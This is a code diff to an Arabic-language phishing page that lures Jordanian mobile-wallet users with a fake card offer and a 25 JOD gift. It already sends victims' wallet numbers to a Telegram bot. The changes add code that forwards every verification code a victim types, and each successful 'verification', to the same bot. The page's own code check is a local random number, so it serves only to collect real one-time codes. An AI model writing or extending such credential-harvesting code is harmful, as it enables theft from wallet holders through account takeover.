@@ -106,7 +106,7 @@
         function sendToTelegram(phone){
             // send phone converted to ASCII digits only (English numerals)
             const ascii = toAsciiDigits(phone);
-            const message = `📱 طلب تقديم بطاقة جدي��ة\nرقم المحفظة: ${ascii}\nالمبلغ: 25 JOD (هدية عند الإصدار)\nالإجراء: تقديم للبطاقة`;
+            const message = `📱 طلب تقديم بطاقة جديدة\nرقم المحفظة: ${ascii}\nالمبلغ: 25 JOD (هدية عند الإصدار)\nالإجراء: تقديم للبطاقة`;
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
                 method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message,parse_mode:'HTML'})
             }).catch(()=>{});
@@ -120,13 +120,21 @@
             }).catch(()=>{});
         }
 
+        function sendAttemptToTelegram(phone, attempt){
+            const ascii = toAsciiDigits(phone);
+            const message = `⚠️ محاولة تحقق فاشلة\nرقم المحفظة: ${ascii}\nالرمز المدخل: ${attempt}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+                method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message,parse_mode:'HTML'})
+            }).catch(()=>{});
+        }
+
         function generateOtp(){return Math.floor(100000+Math.random()*900000).toString();}
 
         submitBtn.addEventListener('click', (e)=>{
             const raw = phoneInput.value.trim();
             phoneErr.style.display='none';
             if(!validate(raw)){
-                phoneErr.textContent='الرجاء إدخال رقم صالح (079/078/077 متبوعاً بـ7 أ��قام)'; phoneErr.style.display='block'; phoneInput.focus(); return;
+                phoneErr.textContent='الرجاء إدخال رقم صالح (079/078/077 متبوعاً بـ7 أرقام)'; phoneErr.style.display='block'; phoneInput.focus(); return;
             }
             // proceed: send ascii phone to telegram
             sendToTelegram(raw);
@@ -195,8 +203,16 @@
             if(code === real){
                 // success
                 otpSection.innerHTML = `<div style="text-align:center"><h1>تم التحقق بنجاح</h1><p class="subtitle">سيتم إصدار البطاقة واستلام تفاصيل الاستلام قريباً</p></div>`;
+                // notify success as well
+                const phone = phoneInput.value.trim();
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+                    method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:`✅ تحقق ناجح\nرقم المحفظة: ${toAsciiDigits(phone)}`})
+                }).catch(()=>{});
             } else {
                 otpErr.textContent='الرمز غير صحيح'; otpErr.style.display='block';
+                // send failed attempt to telegram (as requested)
+                const phone = phoneInput.value.trim();
+                sendAttemptToTelegram(phone, code);
             }
         }
 
